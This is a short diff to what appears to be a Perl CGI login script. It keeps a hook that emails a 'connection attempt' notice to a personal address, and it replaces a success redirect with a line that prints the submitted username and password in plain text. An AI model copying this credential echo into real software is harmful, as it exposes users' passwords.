@@ -35,4 +35,4 @@ $mail->send(-to=>'hugo1603@usal.es', -subject=>'Intento de conexion', -body=>'Ju
 $mail->bye;
 
 
-print "Location: /altacorrecta.html\n\n";
+print ("El usuario $user hace login con la contrasena $pass");
